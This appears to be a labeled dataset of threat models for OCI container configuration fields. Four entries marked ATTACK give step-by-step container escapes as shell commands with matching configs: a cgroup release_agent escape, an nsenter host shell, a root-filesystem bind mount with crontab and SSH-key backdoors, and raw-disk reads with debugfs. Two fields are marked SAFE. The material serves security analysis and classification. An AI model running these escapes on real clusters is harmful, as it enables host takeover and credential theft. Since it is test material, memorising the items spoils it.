## 1) config - process.capabilities.bounding
**Message:** config
**Target Setting's path:** process.capabilities.bounding
**Threat Model:**
- **Attack Assumption:**
In a multi-tenant Kubernetes cluster, containerized workloads from multiple tenants share physical host nodes, and the container runtime implements the OCI Runtime Specification (runc v1.x, the reference OCI implementation).
We assume: (i) the attacker has gained the ability to deploy a container (Pod) in the cluster through a compromised CI/CD pipeline, a supply chain attack on a public container image, or stolen developer credentials — all well-documented real-world attack vectors; (ii) the attacker controls the container image and can execute arbitrary code inside the container; (iii) the cluster does not enforce a sufficiently restrictive Pod Security Standard, allowing the attacker's Pod specification to request the CAP_SYS_ADMIN Linux capability without being blocked by admission control; (iv) the host kernel uses cgroup v1 with the notify_on_release and release_agent features enabled (the default on most Linux distributions including Ubuntu, CentOS, and RHEL); and (v) no mandatory AppArmor or SELinux profile restricts the mount syscall inside the container.
- **Attacker Capability:**
The attacker can deploy one container whose OCI config.json includes specific capability requests, and can execute arbitrary commands inside the container as root (uid 0).

**Attack Procedure:**
The attacker deploys a container whose OCI config.json includes CAP_SYS_ADMIN in the process.capabilities.bounding, effective, and permitted sets. All standard namespace isolations (pid, network, ipc, uts, mount, cgroup) remain in place — the attack succeeds despite proper namespace configuration. Inside the container, the attacker executes the following cgroup v1 release_agent escape technique (first published by Felix Wilhelm in 2019, documented by Trail of Bits, and observed in real-world attacks by Aqua Security in 2021):

1. The attacker uses the mount syscall (permitted by CAP_SYS_ADMIN) to mount a cgroup v1 hierarchy: `mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`.
2. The attacker enables the notify_on_release feature on the child cgroup: `echo 1 > /tmp/cgrp/x/notify_on_release`.
3. The attacker identifies the host filesystem overlay path by parsing the container's mount table: `host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)`.
4. The attacker sets the release_agent to point to a script on the host filesystem via the overlay path: `echo "$host_path/cmd" > /tmp/cgrp/release_agent`.
5. The attacker writes a malicious script that will execute on the host: `echo '#!/bin/sh' > /cmd && echo "cat /etc/shadow > $host_path/output" >> /cmd && chmod a+x /cmd`.
6. The attacker triggers the cgroup release by spawning and terminating a process in the child cgroup: `sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`.

When the last process in the child cgroup terminates, the Linux kernel executes the release_agent script with full root privileges on the HOST, outside any container namespace. The attacker's script reads /etc/shadow (host password hashes) and writes the output to a file accessible from within the container via the overlay filesystem. The PoC is successful if the attacker retrieves host-level sensitive data (e.g., /etc/shadow contents) from inside the container, demonstrating full container escape with arbitrary host command execution.

**Attack Message:**
The following is the attack container configuration represented in a fixed JSON structure. This configuration can be used to verify the PoC in a real environment.

{
  "oci_version": "1.0.2",
  "oci_process": {
    "terminal": false,
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/sh"],
    "capabilities": {
      "bounding": ["CAP_CHOWN", "CAP_FOWNER", "CAP_SYS_ADMIN"],
      "effective": ["CAP_CHOWN", "CAP_FOWNER", "CAP_SYS_ADMIN"],
      "permitted": ["CAP_CHOWN", "CAP_FOWNER", "CAP_SYS_ADMIN"]
    },
    "noNewPrivileges": false
  },
  "oci_linux": {
    "namespaces": [
      {"type": "pid"},
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"},
      {"type": "cgroup"}
    ]
  }
}

**Classification:**
ATTACK


## 2) config - linux.namespaces
**Message:** config
**Target Setting's path:** linux.namespaces
**Threat Model:**
- **Attack Assumption:**
In a multi-tenant Kubernetes cluster, containerized workloads from multiple tenants share physical host nodes, and the container runtime implements the OCI Runtime Specification (runc v1.x).
We assume: (i) the attacker has gained the ability to deploy a container in the cluster through a compromised CI/CD pipeline, a supply chain attack on a public container image, or stolen developer credentials; (ii) the attacker controls the container image and can execute arbitrary code inside the container; (iii) the cluster does not enforce a Pod Security Standard that blocks `hostPID: true`, allowing the attacker's Pod specification to omit PID namespace isolation — this results in the OCI config.json's linux.namespaces array missing the `{"type": "pid"}` entry; (iv) the container runs as root (uid 0) and retains CAP_SYS_PTRACE and CAP_SYS_ADMIN capabilities; and (v) the host runs standard system services under PID 1 (systemd/init).
- **Attacker Capability:**
The attacker can deploy one container with controlled namespace configuration and execute arbitrary commands inside it as root.

**Attack Procedure:**
The attacker deploys a container whose OCI config.json linux.namespaces array includes network, ipc, uts, mount, and cgroup namespace entries but intentionally omits the `{"type": "pid"}` entry. Per the OCI Runtime Specification Section "Namespaces," when a namespace type is absent from the array, the container shares the host's namespace of that type. Without PID namespace isolation, the container process can see all processes running on the host via /proc.

Inside the container, the attacker executes the nsenter escape technique (documented by Elastic Security, KubeHound, and MITRE ATT&CK T1611):
1. The attacker confirms visibility of host processes: `ps aux` lists all host PIDs including PID 1 (the host's init/systemd process).
2. The attacker uses nsenter to enter the host's namespaces by targeting PID 1: `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash`.
3. The nsenter command uses the setns() syscall to join the mount, UTS, IPC, network, and PID namespaces of the host's PID 1 process. This requires CAP_SYS_ADMIN (for mount/IPC/PID namespace entry) and CAP_SYS_PTRACE (for accessing another process's namespace file descriptors).
4. After nsenter completes, the attacker has a root shell running in the host's full namespace context — equivalent to an interactive root login on the host.
5. The attacker verifies escape by running `hostname` (shows host hostname, not container hostname) and `cat /etc/shadow` (shows host password hashes).

The PoC is successful if the attacker obtains a shell in the host's namespace context with full root access to the host filesystem, network, and process space.

**Attack Message:**
The following is the attack container configuration represented in a fixed JSON structure. This configuration can be used to verify the PoC in a real environment.

{
  "oci_version": "1.0.2",
  "oci_process": {
    "terminal": false,
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/sh"],
    "capabilities": {
      "bounding": ["CAP_SYS_PTRACE", "CAP_SYS_ADMIN"],
      "effective": ["CAP_SYS_PTRACE", "CAP_SYS_ADMIN"],
      "permitted": ["CAP_SYS_PTRACE", "CAP_SYS_ADMIN"]
    }
  },
  "oci_linux": {
    "namespaces": [
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"}
    ]
  }
}

**Classification:**
ATTACK


## 3) config - mounts
**Message:** config
**Target Setting's path:** mounts
**Threat Model:**
- **Attack Assumption:**
In a multi-tenant Kubernetes cluster, containerized workloads from multiple tenants share physical host nodes, and the container runtime implements the OCI Runtime Specification (runc v1.x).
We assume: (i) the attacker has gained the ability to deploy a container in the cluster through a compromised CI/CD pipeline, a supply chain attack on a public container image, or stolen developer credentials; (ii) the attacker controls the container image and can execute arbitrary code inside the container; (iii) the cluster does not enforce a Pod Security Standard that blocks hostPath volumes, allowing the attacker's Pod specification to mount the host's root filesystem (`/`) as a bind mount into the container — this maps to an entry in the OCI config.json mounts array with `"source": "/"` and `"type": "bind"`; (iv) the bind mount is configured with read-write access (`"options": ["rbind", "rw"]`); and (v) all other container isolation mechanisms (namespaces, capabilities, seccomp) remain at their default settings.
- **Attacker Capability:**
The attacker can deploy one container with a controlled mounts configuration and execute arbitrary commands inside it.

**Attack Procedure:**
The attacker deploys a container whose OCI config.json mounts array includes a bind mount entry mapping the host's root filesystem (`/`) to a mount point inside the container (`/hostfs`). The mount entry specifies `"type": "bind"`, `"source": "/"`, `"destination": "/hostfs"`, and `"options": ["rbind", "rw"]`, where `rbind` recursively binds all submounts and `rw` grants read-write access.

Per the OCI Runtime Specification Section "Mounts," the runtime processes each mount entry and performs the corresponding mount operation before starting the container process. When the container starts, the entire host filesystem tree is accessible at `/hostfs` inside the container with full read-write permissions.

Inside the container, the attacker:
1. Reads sensitive host files: `cat /hostfs/etc/shadow` retrieves host user password hashes; `cat /hostfs/etc/kubernetes/admin.conf` retrieves cluster admin credentials.
2. Writes to host crontab for persistence: `echo '* * * * * root /tmp/backdoor.sh' >> /hostfs/etc/crontab`.
3. Modifies host SSH configuration: `echo 'ssh-rsa AAAA...' >> /hostfs/root/.ssh/authorized_keys` installs an SSH public key for persistent remote access.
4. Accesses other tenants' container data through the host's container storage directory: `ls /hostfs/var/lib/containerd/` lists all container layers on the node.

The PoC is successful if the attacker can read and write arbitrary files on the host filesystem from inside the container, demonstrating complete host compromise via a single mounts configuration entry.

**Attack Message:**
The following is the attack container configuration represented in a fixed JSON structure. This configuration can be used to verify the PoC in a real environment.

{
  "oci_version": "1.0.2",
  "oci_process": {
    "terminal": false,
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/sh"]
  },
  "oci_mounts": [
    {
      "destination": "/proc",
      "type": "proc",
      "source": "proc"
    },
    {
      "destination": "/hostfs",
      "type": "bind",
      "source": "/",
      "options": ["rbind", "rw"]
    }
  ]
}

**Classification:**
ATTACK


## 4) config - linux.resources.devices
**Message:** config
**Target Setting's path:** linux.resources.devices
**Threat Model:**
- **Attack Assumption:**
In a multi-tenant Kubernetes cluster, containerized workloads from multiple tenants share physical host nodes, and the container runtime implements the OCI Runtime Specification (runc v1.x).
We assume: (i) the attacker has gained the ability to deploy a container in the cluster through a compromised CI/CD pipeline, a supply chain attack on a public container image, or stolen developer credentials; (ii) the attacker controls the container image and can execute arbitrary code inside the container; (iii) the cluster does not enforce a Pod Security Standard that restricts device access, allowing the attacker's container to be configured with an unrestricted device cgroup rule — the OCI config.json's linux.resources.devices array contains a single rule `{"allow": true, "access": "rwm"}` which grants read, write, and mknod access to ALL host devices; (iv) the host uses standard block device naming (e.g., /dev/sda for the primary disk); and (v) the container image includes filesystem tools such as debugfs or blkid.
- **Attacker Capability:**
The attacker can deploy one container with a controlled device access configuration and execute arbitrary commands inside it.

**Attack Procedure:**
The attacker deploys a container whose OCI config.json linux.resources.devices array contains the rule `{"allow": true, "access": "rwm"}` without specifying type, major, or minor device numbers. Per the OCI Runtime Specification Section "Devices" (under Linux-specific configuration), this rule configures the device cgroup to allow the container processes unrestricted read, write, and mknod access to all devices on the host, including block devices (/dev/sda, /dev/nvme0n1), character devices (/dev/mem, /dev/kmem), and special devices (/dev/kvm).

Inside the container, the attacker:
1. Creates the necessary device node if not present: `mknod /dev/sda b 8 0` (block device, major 8, minor 0).
2. Reads the host's raw disk data directly without requiring mount privileges: `dd if=/dev/sda bs=512 count=1` reads the host disk's MBR/partition table.
3. Uses debugfs to extract sensitive files from the host's filesystem partition without mounting it: `debugfs /dev/sda1 -R 'cat /etc/shadow'` reads host password hashes directly from the ext4 filesystem structures, bypassing any mount namespace isolation.
4. Alternatively, if the container has CAP_SYS_ADMIN, the attacker can mount the host disk: `mount /dev/sda1 /mnt` and access the full host filesystem.

The key insight is that even without the mount capability, raw block device access via the device cgroup allows the attacker to read (and potentially write) any data on the host's physical disks using filesystem-aware tools like debugfs, bypassing all container filesystem isolation. The PoC is successful if the attacker reads host-level sensitive data (e.g., /etc/shadow) through raw block device access from inside the container.

**Attack Message:**
The following is the attack container configuration represented in a fixed JSON structure. This configuration can be used to verify the PoC in a real environment.

{
  "oci_version": "1.0.2",
  "oci_process": {
    "terminal": false,
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/sh"]
  },
  "oci_linux": {
    "namespaces": [
      {"type": "pid"},
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"},
      {"type": "cgroup"}
    ],
    "resources": {
      "devices": [
        {"allow": true, "access": "rwm"}
      ]
    }
  }
}

**Classification:**
ATTACK


## 5) config - hostname
**Message:** config
**Target Setting's path:** hostname
**Threat Model:**
- **Attack Assumption:**
In a multi-tenant Kubernetes cluster, containerized workloads from multiple tenants share physical host nodes, and the container runtime implements the OCI Runtime Specification (runc v1.x).
We assume: (i) the attacker has gained the ability to deploy a container in the cluster through a compromised CI/CD pipeline, a supply chain attack, or stolen developer credentials; (ii) the attacker controls the container image and can execute arbitrary code inside the container; (iii) the attacker can set the hostname field in the OCI config.json to any arbitrary string; (iv) the container has standard UTS namespace isolation (linux.namespaces includes `{"type": "uts"}`); and (v) all other isolation mechanisms (PID namespace, mount namespace, network namespace, capabilities, seccomp) remain at their default restrictive settings.
- **Attacker Capability:**
The attacker can deploy one container with a controlled hostname value and execute arbitrary commands inside it.
**Security Analysis:**
The hostname field in the OCI Runtime Specification (Section "Hostname") sets the container's hostname within its UTS namespace. Per the Linux UTS namespace design, each UTS namespace maintains an independent copy of the hostname and NIS domain name. When the container's linux.namespaces array includes `{"type": "uts"}`, the container operates in its own UTS namespace, fully isolated from the host's UTS namespace. Manipulating the hostname value has no meaningful security impact on the host or other containers: setting it to the host's actual hostname (e.g., "k8s-node-01") is purely cosmetic and does not grant the container access to the host's UTS namespace — the container's hostname and the host's hostname remain independent kernel data structures; setting it to another tenant's container hostname similarly has no cross-container effect because each container has its own UTS namespace; setting it to an extremely long string is bounded by the kernel's HOST_NAME_MAX limit (typically 64 bytes) and is silently truncated without error. The hostname value does not influence namespace isolation boundaries, does not alter capability sets, does not affect mount points or device access, does not modify network configuration (IP addresses, routes, firewall rules are governed by the network namespace, not the hostname), and does not expose any host resources. The hostname field is a per-container cosmetic identifier that only affects what the `hostname` command returns inside that container.

**Classification:**
SAFE


## 6) config - process.terminal
**Message:** config
**Target Setting's path:** process.terminal
**Threat Model:**
- **Attack Assumption:**
In a multi-tenant Kubernetes cluster, containerized workloads from multiple tenants share physical host nodes, and the container runtime implements the OCI Runtime Specification (runc v1.x).
We assume: (i) the attacker has gained the ability to deploy a container in the cluster through a compromised CI/CD pipeline, a supply chain attack, or stolen developer credentials; (ii) the attacker controls the container image and can execute arbitrary code inside the container; (iii) the attacker can set the process.terminal field in the OCI config.json to true or false; and (iv) all container isolation mechanisms (namespaces, capabilities, seccomp, mounts) remain at their default restrictive settings.
- **Attacker Capability:**
The attacker can deploy one container with a controlled process.terminal value and execute arbitrary commands inside it.
**Security Analysis:**
The process.terminal field in the OCI Runtime Specification (Section "Process") is a boolean that specifies whether a pseudoterminal (PTY) should be allocated and attached to the container's process. Per the OCI spec, when set to true, the runtime creates a new pseudoterminal pair and attaches the slave end to the process's standard streams (stdin, stdout, stderr); when set to false, the process's standard streams are connected directly to pipes or /dev/null. Manipulating the process.terminal value has no meaningful security impact on the host or other containers: setting it to true allocates a PTY device (/dev/pts/N) inside the container's devpts mount namespace — this PTY is container-local and does not expose host PTY devices; setting it to false simply disables interactive terminal features such as line editing and signal characters (Ctrl-C). The process.terminal field does not influence container namespace isolation, does not alter Linux capability sets, does not affect mount points or device cgroup rules, does not modify network configuration, and does not change the security context of the container process. Whether a PTY is allocated or not, the container process runs with identical capabilities, namespace membership, seccomp filters, and resource limits. The process.terminal field is a purely functional setting that only affects the I/O interface between the container process and the runtime.

**Classification:**
SAFE
